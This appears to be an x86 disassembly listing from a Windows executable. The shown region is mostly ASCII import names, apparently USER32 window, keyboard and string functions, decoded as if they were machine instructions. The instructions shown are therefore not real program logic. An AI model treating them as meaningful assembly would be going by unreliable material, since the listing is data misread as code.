  413bcf:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x6f646e69
  413bd7:	ja     0x413c4c
  413bd9:	add    BYTE PTR [esi+0x616f4c01],dh
  413bdf:	fs dec ebp
  413be1:	outs   dx,BYTE PTR gs:[esi]
  413be3:	jne    0x413c26
  413be5:	add    al,al
  413be7:	add    BYTE PTR [ebp+0x6e],al
  413bea:	popa   
  413beb:	bound  ebp,QWORD PTR [ebp+eiz*2+0x53]
  413bef:	arpl   WORD PTR [edx+0x6f],si
  413bf2:	ins    BYTE PTR es:[edi],dx
  413bf3:	ins    BYTE PTR es:[edi],dx
  413bf4:	inc    edx
  413bf5:	popa   
  413bf6:	jb     0x413bf8
  413bf8:	xor    al,BYTE PTR [ecx]
  413bfa:	inc    edi
  413bfb:	gs je  0x413c4b
  413bfe:	outs   dx,BYTE PTR gs:[esi]
  413c00:	jne    0x413c4b
  413c02:	je     0x413c69
  413c04:	ins    DWORD PTR es:[edi],dx
  413c05:	inc    ebx
  413c06:	outs   dx,DWORD PTR ds:[esi]
  413c07:	jne    0x413c77
  413c09:	je     0x413c0b
  413c0b:	add    cl,ah
  413c0d:	add    BYTE PTR [esi+0x69],al
  413c10:	outs   dx,BYTE PTR ds:[esi]
  413c11:	fs push edi
  413c13:	imul   ebp,DWORD PTR [esi+0x64],0x41776f
  413c1a:	rol    BYTE PTR [ecx],1
  413c1c:	dec    ebp
  413c1d:	gs jae 0x413c93
  413c20:	popa   
  413c21:	addr16 gs inc edx
  413c24:	outs   dx,DWORD PTR ds:[esi]
  413c25:	js     0x413c6c
  413c27:	js     0x413c80
  413c29:	add    BYTE PTR [eax+0x536e4901],al
  413c2f:	outs   dx,BYTE PTR gs:[esi]
  413c31:	fs dec ebp
  413c33:	gs jae 0x413ca9
  413c36:	popa   
  413c37:	addr16 gs add al,bl
  413c3b:	add    DWORD PTR [ebp+0x6f],ecx
  413c3e:	outs   dx,BYTE PTR ds:[esi]
  413c3f:	imul   esi,DWORD PTR [edi+ebp*2+0x72],0x6d6f7246
  413c47:	push   eax
  413c48:	outs   dx,DWORD PTR ds:[esi]
  413c49:	imul   ebp,DWORD PTR [esi+0x74],0x1680000
  413c50:	inc    edi
  413c51:	gs je  0x413cab
  413c54:	imul   ebp,DWORD PTR [esi+0x64],0x7d00776f
  413c5b:	add    dl,BYTE PTR [ebx+0x68]
  413c5e:	outs   dx,DWORD PTR ds:[esi]
  413c5f:	ja     0x413cb4
  413c61:	arpl   WORD PTR [edx+0x6f],si
  413c64:	ins    BYTE PTR es:[edi],dx
  413c65:	ins    BYTE PTR es:[edi],dx
  413c66:	inc    edx
  413c67:	popa   
  413c68:	jb     0x413c6a
  413c6a:	mov    cl,0x1
  413c6c:	dec    esp
  413c6d:	outs   dx,DWORD PTR ds:[esi]
  413c6e:	popa   
  413c6f:	fs dec ecx
  413c71:	ins    DWORD PTR es:[edi],dx
  413c72:	popa   
  413c73:	addr16 gs inc ecx
  413c76:	add    BYTE PTR [eax],al
  413c78:	cdq    
  413c79:	add    BYTE PTR [ecx+ebp*2+0x61],al
  413c7d:	ins    BYTE PTR es:[edi],dx
  413c7e:	outs   dx,DWORD PTR ds:[esi]
  413c7f:	addr16 inc edx
  413c81:	outs   dx,DWORD PTR ds:[esi]
  413c82:	js     0x413ccd
  413c84:	outs   dx,BYTE PTR ds:[esi]
  413c85:	imul   esi,DWORD PTR fs:[edx+0x65],0x61507463
  413c8d:	jb     0x413cf0
  413c8f:	ins    DWORD PTR es:[edi],dx
  413c90:	inc    ecx
  413c91:	add    ch,al
  413c93:	add    DWORD PTR [ebp+0x61],ecx
  413c96:	jo     0x413cee
  413c98:	imul   esi,DWORD PTR [edx+0x74],0x4b6c6175
  413c9f:	gs jns 0x413ce3
  413ca2:	add    BYTE PTR [eax],al
  413ca4:	sbb    BYTE PTR [edx],al
  413ca6:	push   edx
  413ca7:	gs ins DWORD PTR es:[edi],dx
  413ca9:	outs   dx,DWORD PTR ds:[esi]
  413caa:	jbe    0x413d11
  413cac:	push   eax
  413cad:	jb     0x413d1e
  413caf:	jo     0x413d08
  413cb1:	add    BYTE PTR [ecx+eax*1+0x47],ah
  413cb5:	gs je  0x413d0d
  413cb8:	jo     0x413d1e
  413cba:	popa   
  413cbb:	je     0x413d22
  413cbd:	push   edx
  413cbe:	outs   dx,BYTE PTR ds:[si]
  413cc0:	add    BYTE PTR [eax],al
  413cc2:	add    al,BYTE PTR [edx]
  413cc4:	push   edx
  413cc5:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6c437265
  413cce:	popa   
  413ccf:	jae    0x413d44
  413cd1:	inc    ecx
  413cd2:	add    BYTE PTR [eax],al
  413cd4:	add    dl,BYTE PTR ds:[ebx+0x65]
  413cd8:	je     0x413d1e
  413cda:	ins    BYTE PTR es:[edi],dx
  413cdb:	addr16 dec ecx
  413cdd:	je     0x413d44
  413cdf:	ins    DWORD PTR es:[edi],dx
  413ce0:	push   esp
  413ce1:	gs js  0x413d58
  413ce4:	inc    ecx
  413ce5:	add    BYTE PTR [ebp+0x61724400],dh
  413ceb:	ja     0x413d3a
  413ced:	outs   dx,BYTE PTR gs:[esi]
  413cef:	jne    0x413d33
  413cf1:	popa   
  413cf2:	jb     0x413cf4
  413cf4:	sub    eax,DWORD PTR [ecx]
  413cf6:	inc    edi
  413cf7:	gs je  0x413d47
  413cfa:	outs   dx,BYTE PTR gs:[esi]
  413cfc:	jne    0x413cfe
  413cfe:	repnz add DWORD PTR [eax+0x6f],edx
  413d02:	jae    0x413d78
  413d04:	dec    ebp
  413d05:	gs jae 0x413d7b
  413d08:	popa   
  413d09:	addr16 gs push edi
  413d0c:	add    BYTE PTR [eax],al
  413d0e:	push   cs
  413d0f:	add    DWORD PTR [edi+0x65],eax
  413d12:	je     0x413d58
  413d14:	ins    BYTE PTR es:[edi],dx
  413d15:	addr16 inc ebx
  413d17:	je     0x413d8b
  413d19:	ins    BYTE PTR es:[edi],dx
  413d1a:	dec    ecx
  413d1b:	inc    esp
  413d1c:	add    BYTE PTR [eax],al
  413d1e:	mov    cl,0x2
  413d20:	push   esi
  413d21:	imul   ecx,DWORD PTR [ebx+0x65],0x79
  413d25:	push   ebx
  413d26:	arpl   WORD PTR [ecx+0x6e],sp
  413d29:	push   edi
  413d2a:	add    BYTE PTR [eax],al
  413d2c:	sbb    BYTE PTR [ecx],al
  413d2e:	inc    edi
  413d2f:	gs je  0x413d7b
  413d32:	arpl   WORD PTR [edi+0x6e],bp
  413d35:	dec    ecx
  413d36:	outs   dx,BYTE PTR ds:[esi]
  413d37:	outs   dx,WORD PTR ds:[esi]
  413d39:	add    cl,cl
  413d3b:	add    DWORD PTR [ebp+0x61],ecx
  413d3e:	jo     0x413d97
  413d40:	imul   ebp,DWORD PTR [esi+0x64],0x6f50776f
  413d47:	imul   ebp,DWORD PTR [esi+0x74],0x2d0073
  413d4e:	inc    ebx
  413d4f:	push   0x654e7261
  413d54:	js     0x413dca
  413d56:	push   edi
  413d57:	add    BYTE PTR [ecx],ch
  413d59:	add    dl,BYTE PTR [ebx+0x65]
  413d5c:	outs   dx,BYTE PTR ds:[esi]
  413d5d:	fs dec ebp
  413d5f:	gs jae 0x413dd5
  413d62:	popa   
  413d63:	addr16 gs push esp
  413d66:	imul   ebp,DWORD PTR [ebp+0x65],0x4174756f
  413d6d:	add    BYTE PTR [eax],ch
  413d6f:	add    BYTE PTR [ebx+0x68],al
  413d72:	popa   
  413d73:	jb     0x413dc1
  413d75:	outs   dx,DWORD PTR ds:[esi]
  413d76:	ja     0x413ddd
  413d78:	jb     0x413dbc
  413d7a:	jne    0x413de2
  413d7c:	push   di
  413d7e:	add    BYTE PTR [eax],al
  413d80:	ins    DWORD PTR es:[edi],dx
  413d81:	add    DWORD PTR [edi+0x65],eax
  413d84:	je     0x413ddd
  413d86:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  413d8d:	outs   dx,BYTE PTR ds:[esi]
  413d8e:	addr16 push edi
  413d90:	add    BYTE PTR [eax],al
  413d92:	mov    bh,0x2
  413d94:	push   edi
  413d95:	popa   
  413d96:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x706e4972
  413d9e:	jne    0x413e14
  413da0:	dec    ecx
  413da1:	fs ins BYTE PTR es:[edi],dx
  413da3:	add    BYTE PTR gs:[eax],al
  413da6:	mov    DWORD PTR [ecx],0x5670614d
  413dac:	imul   esi,DWORD PTR [edx+0x74],0x4b6c6175
  413db3:	gs jns 0x413dfb
  413db6:	js     0x413e0f
  413db8:	add    BYTE PTR [eax],al
  413dba:	cmp    eax,0x65684300
  413dbf:	arpl   WORD PTR [ebx+0x52],bp
  413dc2:	popa   
  413dc3:	imul   ebp,DWORD PTR fs:[edi+0x42],0x6f747475
  413dcb:	outs   dx,BYTE PTR ds:[esi]
  413dcc:	add    BYTE PTR [eax],al
  413dce:	add    eax,0x6c6c4100
  413dd3:	outs   dx,DWORD PTR ds:[esi]
  413dd4:	ja     0x413e29
  413dd6:	gs je  0x413e1f
  413dd9:	outs   dx,DWORD PTR ds:[esi]
  413dda:	jb     0x413e41
  413ddc:	addr16 jb 0x413e4e
  413ddf:	jne    0x413e4f
  413de1:	fs push edi
  413de3:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  413dea:	into   
  413deb:	add    DWORD PTR [ebp+0x65],ecx
  413dee:	jae    0x413e63
  413df0:	popa   
  413df1:	addr16 gs inc edx
  413df4:	outs   dx,DWORD PTR ds:[esi]
  413df5:	js     0x413e38
  413df7:	add    BYTE PTR [edx],bh
  413df9:	add    DWORD PTR [edi+0x65],eax
  413dfc:	je     0x413e4b
  413dfe:	gs jae 0x413e74
  413e01:	popa   
  413e02:	addr16 gs inc ecx
  413e05:	add    BYTE PTR [edx+0x2],cl
  413e08:	push   ebx
  413e09:	gs je  0x413e59
  413e0c:	outs   dx,BYTE PTR gs:[esi]
  413e0e:	jne    0x413e54
  413e10:	gs popaw 
  413e13:	jne    0x413e81
  413e15:	je     0x413e60
  413e17:	je     0x413e7e
  413e19:	ins    DWORD PTR es:[edi],dx
  413e1a:	add    BYTE PTR [eax],al
  413e1c:	aad    0x1
  413e1e:	dec    ebp
  413e1f:	gs jae 0x413e95
  413e22:	popa   
  413e23:	addr16 gs inc edx
  413e26:	outs   dx,DWORD PTR ds:[esi]
  413e27:	js     0x413e80
  413e29:	add    BYTE PTR [ecx],bh
  413e2b:	add    DWORD PTR [edi+0x65],eax
  413e2e:	je     0x413e7d
  413e30:	outs   dx,BYTE PTR gs:[esi]
  413e32:	jne    0x413e87
  413e34:	je     0x413ea8
  413e36:	imul   ebp,DWORD PTR [esi+0x67],0xb9000057
  413e3d:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  413e41:	fs dec ebp
  413e43:	outs   dx,BYTE PTR gs:[esi]
  413e45:	jne    0x413e9e
  413e47:	add    BYTE PTR [ecx+eax*1+0x47],bl
  413e4b:	gs je  0x413ea1
  413e4e:	jns    0x413ec3
  413e50:	je     0x413eb7
  413e52:	ins    DWORD PTR es:[edi],dx
  413e53:	dec    ebp
  413e54:	gs je  0x413ec9
  413e57:	imul   esp,DWORD PTR [ebx+0x73],0x2260000
  413e5e:	push   ebx
  413e5f:	outs   dx,BYTE PTR gs:[esi]
  413e61:	fs dec ebp
  413e63:	gs jae 0x413ed9
  413e66:	popa   
  413e67:	addr16 gs inc ecx
  413e6a:	add    BYTE PTR [eax],al
  413e6c:	aaa    
  413e6d:	add    DWORD PTR [edi+0x65],eax
  413e70:	je     0x413ebf
  413e72:	outs   dx,BYTE PTR gs:[esi]
  413e74:	jne    0x413ec9
  413e76:	je     0x413ed9
  413e78:	je     0x413edf
  413e7a:	add    BYTE PTR [eax],al
  413e7c:	mov    bl,0x0
  413e7e:	inc    esp
  413e7f:	jb     0x413ee2
  413e81:	ja     0x413ecc
  413e83:	arpl   WORD PTR [edi+0x6e],bp
  413e86:	add    BYTE PTR [eax],al
  413e88:	xchg   ebp,eax
  413e89:	add    BYTE PTR [ebp+eiz*2+0x73],al
  413e8d:	je     0x413f01
  413e8f:	outs   dx,DWORD PTR ds:[esi]
  413e90:	jns    0x413ed5
  413e92:	jne    0x413f06
  413e94:	jae    0x413f05
  413e96:	jb     0x413e98
  413e98:	add    al,BYTE PTR [eax]
  413e9a:	inc    ecx
  413e9b:	fs push 0x75
  413e9e:	jae    0x413f14
  413ea0:	push   edi
  413ea1:	imul   ebp,DWORD PTR [esi+0x64],0x6552776f
  413ea8:	arpl   WORD PTR [eax+eax*1+0x0],si
  413eac:	pop    ecx
  413ead:	add    DWORD PTR [edi+0x65],eax
  413eb0:	je     0x413f05
  413eb2:	jns    0x413f27
  413eb4:	inc    ebx
  413eb5:	outs   dx,DWORD PTR ds:[esi]
  413eb6:	ins    BYTE PTR es:[edi],dx
  413eb7:	outs   dx,DWORD PTR ds:[esi]
  413eb8:	jb     0x413eba
  413eba:	jle    0x413ebd
  413ebc:	dec    eax
  413ebd:	imul   ebp,DWORD PTR [ecx+ebp*2+0x74],0x6e654d65
  413ec5:	jne    0x413f10
  413ec7:	je     0x413f2e
  413ec9:	ins    DWORD PTR es:[edi],dx
  413eca:	add    BYTE PTR [eax],al
  413ecc:	or     DWORD PTR [eax],eax
  413ece:	inc    ecx
  413ecf:	jo     0x413f41
  413ed1:	outs   dx,BYTE PTR gs:[esi]
  413ed3:	fs dec ebp
  413ed5:	outs   dx,BYTE PTR gs:[esi]
  413ed7:	jne    0x413f30
  413ed9:	add    BYTE PTR [eax+eax*1],bh
  413edc:	inc    ebx
  413edd:	push   0x4d6b6365
  413ee2:	outs   dx,BYTE PTR gs:[esi]
  413ee4:	jne    0x413f38
  413ee6:	popa   
  413ee7:	imul   ebp,DWORD PTR fs:[edi+0x49],0x6d6574
  413eef:	add    BYTE PTR [ecx+eax*1+0x64616f4c],bh
  413ef6:	push   ebx
  413ef7:	je     0x413f6b
  413ef9:	imul   ebp,DWORD PTR [esi+0x67],0x21f0057
  413f00:	push   ebx
  413f01:	arpl   WORD PTR [edx+0x6f],si
  413f04:	ins    BYTE PTR es:[edi],dx
  413f05:	ins    BYTE PTR es:[edi],dx
  413f06:	push   edi
  413f07:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  413f0e:	xor    DWORD PTR [eax],eax
  413f10:	inc    ebx
  413f11:	push   0x72507261
  413f16:	gs jbe 0x413f70
  413f19:	add    BYTE PTR [edi+0x2],bl
  413f1c:	push   ebx
  413f1d:	gs je  0x413f73
  413f20:	jns    0x413f95
  413f22:	inc    ebx
  413f23:	outs   dx,DWORD PTR ds:[esi]
  413f24:	ins    BYTE PTR es:[edi],dx
  413f25:	outs   dx,DWORD PTR ds:[esi]
  413f26:	jb     0x413f9b
  413f28:	add    BYTE PTR [eax],al
  413f2a:	sgdtd  [edi+0x65]
  413f2e:	je     0x413f74
  413f30:	ins    BYTE PTR es:[edi],dx
  413f31:	addr16 dec ecx
  413f33:	je     0x413f9a
  413f35:	ins    DWORD PTR es:[edi],dx
  413f36:	add    BYTE PTR [eax],al
  413f38:	dec    esp
  413f39:	add    dl,BYTE PTR [ebx+0x65]
  413f3c:	je     0x413f8b
  413f3e:	outs   dx,BYTE PTR gs:[esi]
  413f40:	jne    0x413f8b
  413f42:	je     0x413fa9
  413f44:	ins    DWORD PTR es:[edi],dx
  413f45:	inc    edx
  413f46:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x7370
  413f4e:	or     al,0x1
  413f50:	inc    edi
  413f51:	gs je  0x413f98
  413f54:	gs jae 0x413fc2
  413f57:	je     0x413fc8
  413f59:	jo     0x413fb2
  413f5b:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  413f62:	inc    ebp
  413f63:	add    DWORD PTR [edi+0x65],eax
  413f66:	je     0x413fb8
  413f68:	popa   
  413f69:	jb     0x413fd0
  413f6b:	outs   dx,BYTE PTR ds:[esi]
  413f6c:	je     0x413f6e
  413f6e:	mov    BYTE PTR [eax],0x45
  413f71:	outs   dx,BYTE PTR ds:[esi]
  413f72:	fs push esp
  413f74:	popa   
  413f75:	jae    0x413fe2
  413f77:	add    BYTE PTR [eax+0x0],ah
  413f7a:	inc    ebx
  413f7b:	jb     0x413fe2
  413f7d:	popa   
  413f7e:	je     0x413fe5
  413f80:	dec    ebp
  413f81:	outs   dx,BYTE PTR gs:[esi]
  413f83:	jne    0x413f85
  413f85:	add    bl,dh
  413f87:	add    BYTE PTR [edi+0x65],al
  413f8a:	je     0x413fcf
  413f8c:	popa   
  413f8d:	jb     0x413ff4
  413f8f:	je     0x413fe1
  413f91:	outs   dx,DWORD PTR ds:[esi]
  413f92:	jae    0x413f94
  413f94:	sub    eax,DWORD PTR [edx]
  413f96:	push   ebx
  413f97:	outs   dx,BYTE PTR gs:[esi]
  413f99:	fs dec ebp
  413f9b:	gs jae 0x414011
  413f9e:	popa   
  413f9f:	addr16 gs push edi
  413fa2:	add    BYTE PTR [eax],al
  413fa4:	test   DWORD PTR [ecx],eax
  413fa6:	dec    ecx
  413fa7:	outs   dx,BYTE PTR ds:[esi]
  413fa8:	jae    0x41400f
  413faa:	jb     0x414020
  413fac:	dec    ebp
  413fad:	outs   dx,BYTE PTR gs:[esi]
  413faf:	jne    0x413ffa
  413fb1:	je     0x414018
  413fb3:	ins    DWORD PTR es:[edi],dx
  413fb4:	push   edi
  413fb5:	add    BYTE PTR [ecx+0x0],ah
  413fb8:	inc    ebx
  413fb9:	jb     0x414020
  413fbb:	popa   
  413fbc:	je     0x414023
  413fbe:	push   eax
  413fbf:	outs   dx,DWORD PTR ds:[esi]
  413fc0:	jo     0x414037
  413fc2:	jo     0x414011
  413fc4:	outs   dx,BYTE PTR gs:[esi]
  413fc6:	jne    0x413fc8
  413fc8:	inc    eax
  413fc9:	add    DWORD PTR [edi+0x65],eax
  413fcc:	je     0x41401b
  413fce:	outs   dx,DWORD PTR ds:[esi]
  413fcf:	outs   dx,BYTE PTR ds:[esi]
  413fd0:	imul   esi,DWORD PTR [edi+ebp*2+0x72],0x6f666e49
  413fd8:	push   edi
  413fd9:	add    al,cl
  413fdb:	add    DWORD PTR [ebp+0x61],ecx
  413fde:	jo     0x414036
  413fe0:	imul   esi,DWORD PTR [edx+0x74],0x4b6c6175
  413fe7:	gs jns 0x414041
  413fea:	add    BYTE PTR [eax],al
  413fec:	out    0x0,eax
  413fee:	inc    esi
  413fef:	jb     0x414052
  413ff1:	ins    DWORD PTR es:[edi],dx
  413ff2:	gs push edx
  413ff4:	arpl   WORD PTR gs:[eax+eax*1-0x41],si
  413ff9:	add    BYTE PTR [ebp+0x6e],al
  413ffc:	popa   
  413ffd:	bound  ebp,QWORD PTR [ebp+eiz*2+0x4d]
  414001:	outs   dx,BYTE PTR gs:[esi]
  414003:	jne    0x41404e
  414005:	je     0x41406c
  414007:	ins    DWORD PTR es:[edi],dx
  414008:	add    BYTE PTR [eax],al
  41400a:	fwait
  41400b:	add    dl,BYTE PTR [ebp+0x6e]
  41400e:	ins    BYTE PTR es:[edi],dx
  41400f:	outs   dx,DWORD PTR ds:[esi]
  414010:	popa   
  414011:	fs dec ebx
  414013:	gs jns 0x414078
  414016:	outs   dx,DWORD PTR ds:[esi]
  414017:	popa   
  414018:	jb     0x41407e
  41401a:	dec    esp
  41401b:	popa   
  41401c:	jns    0x41408d
  41401e:	jne    0x414094
  414020:	add    BYTE PTR [eax],al
  414022:	mov    esp,0x6e695702
  414027:	outs   dx,DWORD PTR fs:[esi]
  414029:	ja     0x414071
  41402b:	jb     0x41409c
  41402d:	ins    DWORD PTR es:[edi],dx
  41402e:	push   eax
  41402f:	outs   dx,DWORD PTR ds:[esi]
  414030:	imul   ebp,DWORD PTR [esi+0x74],0x4400ab00
  414037:	jb     0x41409a
  414039:	ja     0x41407c
  41403b:	outs   dx,BYTE PTR ds:[esi]
  41403c:	imul   ebp,DWORD PTR [ebp+0x61],0x52646574
  414043:	arpl   WORD PTR gs:[ebx+esi*2+0x0],si
  414048:	and    BYTE PTR [edx],al
  41404a:	push   ebx
  41404b:	arpl   WORD PTR [edx+0x6f],si
  41404e:	ins    BYTE PTR es:[edi],dx
  41404f:	ins    BYTE PTR es:[edi],dx
  414050:	push   edi
  414051:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  414058:	add    BYTE PTR [eax],al
  41405a:	pop    eax
  41405b:	add    dl,BYTE PTR [ebx+0x65]
  41405e:	je     0x4140b2
  414060:	arpl   WORD PTR gs:[eax+eax*1+0x3d],si
  414065:	add    dl,BYTE PTR [ebx+0x65]
  414068:	je     0x4140ae
  41406a:	ins    BYTE PTR es:[edi],dx
  41406b:	addr16 dec ecx
  41406d:	je     0x4140d4
  41406f:	ins    DWORD PTR es:[edi],dx
  414070:	dec    ecx
  414071:	outs   dx,BYTE PTR ds:[esi]
  414072:	je     0x414074
  414074:	or     eax,0x67654200
  414079:	imul   ebp,DWORD PTR [esi+0x50],0x746e6961
  414080:	add    BYTE PTR [eax],al
  414082:	pop    ebp
  414083:	add    BYTE PTR [ebx+0x72],al
  414086:	gs popa 
  414088:	je     0x4140ef
  41408a:	dec    ecx
  41408b:	arpl   WORD PTR [edi+0x6e],bp
  41408e:	dec    ecx
  41408f:	outs   dx,BYTE PTR ds:[esi]
  414090:	imul   esi,DWORD PTR fs:[edx+0x65],0x7463
  414098:	dec    esi
  414099:	add    dl,BYTE PTR [ebx+0x65]
  41409c:	je     0x4140eb
  41409e:	outs   dx,BYTE PTR gs:[esi]
  4140a0:	jne    0x4140eb
  4140a2:	je     0x414109
  4140a4:	ins    DWORD PTR es:[edi],dx
  4140a5:	dec    ecx
  4140a6:	outs   dx,BYTE PTR ds:[esi]
  4140a7:	outs   dx,WORD PTR ds:[esi]
  4140a9:	push   edi
  4140aa:	add    BYTE PTR [eax],al
  4140ac:	pop    edx
  4140ad:	add    dl,BYTE PTR [ebx+0x65]
  4140b0:	je     0x414105
  4140b2:	arpl   WORD PTR [edx+0x6f],si
  4140b5:	ins    BYTE PTR es:[edi],dx
  4140b6:	ins    BYTE PTR es:[edi],dx
  4140b7:	dec    ecx
  4140b8:	outs   dx,BYTE PTR ds:[esi]
  4140b9:	outs   dx,WORD PTR ds:[esi]
  4140bb:	add    BYTE PTR [edx],dh
  4140bd:	add    BYTE PTR [ebx+0x68],al
  4140c0:	popa   
  4140c1:	jb     0x414117
  4140c3:	outs   dx,DWORD PTR ds:[esi]
  4140c4:	dec    edi
  4140c5:	gs ins DWORD PTR es:[edi],dx
  4140c7:	inc    ecx
  4140c8:	add    BYTE PTR [eax],al
  4140ca:	sub    eax,0x6e655302
  4140cf:	fs dec esi
  4140d1:	outs   dx,DWORD PTR ds:[esi]
  4140d2:	je     0x41413d
  4140d4:	data16 jns 0x414124
  4140d7:	gs jae 0x41414d
  4140da:	popa   
  4140db:	addr16 gs push edi
  4140de:	add    BYTE PTR [eax],al
  4140e0:	sti    
  4140e1:	add    BYTE PTR [edi+0x65],al
  4140e4:	je     0x414129
  4140e6:	ins    BYTE PTR es:[edi],dx
  4140e7:	popa   
  4140e8:	jae    0x41415d
  4140ea:	dec    esi
  4140eb:	popa   
  4140ec:	ins    DWORD PTR es:[edi],dx
  4140ed:	gs push edi
  4140ef:	add    BYTE PTR [ebx+0x61725402],dl
  4140f5:	outs   dx,BYTE PTR ds:[esi]
  4140f6:	jae    0x414164
  4140f8:	popa   
  4140f9:	je     0x414160
  4140fb:	inc    ecx
  4140fc:	arpl   WORD PTR [ebx+0x65],sp
  4140ff:	ins    BYTE PTR es:[edi],dx
  414100:	gs jb  0x414164
  414103:	je     0x414174
  414105:	jb     0x414148
  414107:	add    BYTE PTR [ebx+0x2],bh
  41410a:	push   ebx
  41410b:	push   0x7543776f
  414110:	jb     0x414185
  414112:	outs   dx,DWORD PTR ds:[esi]
  414113:	jb     0x414115
  414115:	add    BYTE PTR [ebx+0x2],dh
  414118:	push   ebx
  414119:	gs je  0x414173
  41411c:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  414123:	js     0x414199
  414125:	inc    ecx
  414126:	add    BYTE PTR [eax],al
  414128:	add    BYTE PTR es:[ebx+0x68],al
  41412c:	popa   
  41412d:	jb     0x41417b
  41412f:	outs   dx,DWORD PTR ds:[esi]
  414130:	ja     0x414197
  414132:	jb     0x414175
  414134:	add    BYTE PTR [eax],al
  414136:	xchg   BYTE PTR [ecx],al
  414138:	dec    ecx
  414139:	outs   dx,BYTE PTR ds:[esi]
  41413a:	jae    0x4141a1
  41413c:	jb     0x4141b2
  41413e:	dec    ebp
  41413f:	outs   dx,BYTE PTR gs:[esi]
  414141:	jne    0x41419a
  414143:	add    BYTE PTR [eax],cl
  414145:	add    BYTE PTR [ecx+0x70],al
  414148:	jo     0x4141af
  41414a:	outs   dx,BYTE PTR ds:[esi]
  41414b:	fs dec ebp
  41414d:	outs   dx,BYTE PTR gs:[esi]
  41414f:	jne    0x414192
  414151:	add    BYTE PTR [edx+0x1],ch
  414154:	inc    edi
  414155:	gs je  0x4141af
  414158:	imul   ebp,DWORD PTR [esi+0x64],0x4344776f
  41415f:	add    BYTE PTR [ecx+0x2],bl
  414162:	push   ebx
  414163:	gs je  0x4141b8
  414166:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  41416b:	jo     0x4141e1
  41416d:	jns    0x41416f
  41416f:	add    BYTE PTR [edx+0x1],bl
  414172:	inc    edi
  414173:	gs je  0x4141c9
  414176:	jns    0x4141eb
  414178:	inc    ebx
  414179:	outs   dx,DWORD PTR ds:[esi]
  41417a:	ins    BYTE PTR es:[edi],dx
  41417b:	outs   dx,DWORD PTR ds:[esi]
  41417c:	jb     0x4141c0
  41417e:	jb     0x4141f5
  414180:	jae    0x4141ea
  414182:	add    BYTE PTR [eax],al
  414184:	jg     0x414188
  414186:	push   ebx
  414187:	push   0x6957776f
  41418c:	outs   dx,BYTE PTR ds:[esi]
  41418d:	outs   dx,DWORD PTR fs:[esi]
  41418f:	ja     0x414191
  414191:	add    BYTE PTR [eax+eax*1],ah
  414194:	inc    ebx
  414195:	push   0x65676e61
  41419a:	dec    ebp
  41419b:	outs   dx,BYTE PTR gs:[esi]
  41419d:	jne    0x4141f6
  41419f:	add    al,ah
  4141a1:	add    DWORD PTR [edi+0x65],ecx
  4141a4:	ins    DWORD PTR es:[edi],dx
  4141a5:	push   esp
  4141a6:	outs   dx,DWORD PTR ds:[esi]
  4141a7:	inc    ebx
  4141a8:	push   0x417261
  4141ad:	add    BYTE PTR [edi+0x43734901],cl
  4141b3:	push   0x6c417261
  4141b8:	jo     0x414222
  4141ba:	popa   
  4141bb:	push   edi
  4141bc:	add    BYTE PTR [eax],al
  4141be:	xchg   BYTE PTR [edx],al
  4141c0:	push   ebx
  4141c1:	jns    0x414236
  4141c3:	je     0x41422a
  4141c5:	ins    DWORD PTR es:[edi],dx
  4141c6:	push   eax
  4141c7:	popa   
  4141c8:	jb     0x41422b
  4141ca:	ins    DWORD PTR es:[edi],dx
  4141cb:	gs je  0x414233
  4141ce:	jb     0x414243
  4141d0:	dec    ecx
  4141d1:	outs   dx,BYTE PTR ds:[esi]
  4141d2:	outs   dx,WORD PTR ds:[esi]
  4141d4:	push   edi
  4141d5:	add    BYTE PTR ds:0x67655202,al
  4141db:	imul   esi,DWORD PTR [ebx+0x74],0x6c437265
  4141e2:	popa   
  4141e3:	jae    0x414258
  4141e5:	push   edi
  4141e6:	add    BYTE PTR [eax],al
  4141e8:	add    BYTE PTR [edx],0x53
  4141eb:	push   0x6957776f
  4141f0:	outs   dx,BYTE PTR ds:[esi]
  4141f1:	outs   dx,DWORD PTR fs:[esi]
  4141f3:	ja     0x414236
  4141f5:	jae    0x414270
  4141f7:	outs   dx,BYTE PTR ds:[esi]
  4141f8:	arpl   WORD PTR [eax],ax
  4141fa:	mov    edi,0x70737702
  4141ff:	jb     0x41426a
  414201:	outs   dx,BYTE PTR ds:[esi]
  414202:	je     0x41426a
  414204:	inc    ecx
  414205:	add    BYTE PTR [esi+0x2],ch
  414208:	push   ebx
  414209:	gs je  0x414263
  41420c:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  414213:	outs   dx,BYTE PTR ds:[esi]
  414214:	addr16 push edi
  414216:	add    BYTE PTR [eax],al
  414218:	test   BYTE PTR [edx],al
  41421a:	push   ebx
  41421b:	ja     0x414286
  41421d:	je     0x414282
  41421f:	push   0x68546f54
  414224:	imul   esi,DWORD PTR [ebx+0x57],0x6f646e69
  41422b:	ja     0x41422d
  41422d:	add    al,al
  41422f:	add    dh,BYTE PTR [edi+0x73]
  414232:	jo     0x4142a6
  414234:	imul   ebp,DWORD PTR [esi+0x74],0x97005766
  41423b:	add    DWORD PTR [ecx+0x73],ecx
  41423e:	inc    esp
  41423f:	imul   esp,DWORD PTR [ecx+0x6c],0x654d676f
  414246:	jae    0x4142bb
  414248:	popa   
  414249:	addr16 gs inc ecx
  41424c:	add    BYTE PTR [eax],al
  41424e:	daa    
  41424f:	add    DWORD PTR [edi+0x65],eax
  414252:	je     0x41429f
  414254:	gs jns 0x4142b9
  414257:	outs   dx,DWORD PTR ds:[esi]
  414258:	popa   
  414259:	jb     0x4142bf
  41425b:	push   esp
  41425c:	jns    0x4142ce
  41425e:	gs add bh,al
  414261:	add    BYTE PTR [ebp+0x6e],al
  414264:	jne    0x4142d3
  414266:	inc    ebx
  414267:	push   0x57646c69
  41426c:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  414273:	add    BYTE PTR [ebp+0x53],dl
  414276:	inc    ebp
  414277:	push   edx
  414278:	xor    esi,DWORD PTR [edx]
  41427a:	cs fs ins BYTE PTR es:[edi],dx
  41427d:	ins    BYTE PTR es:[edi],dx
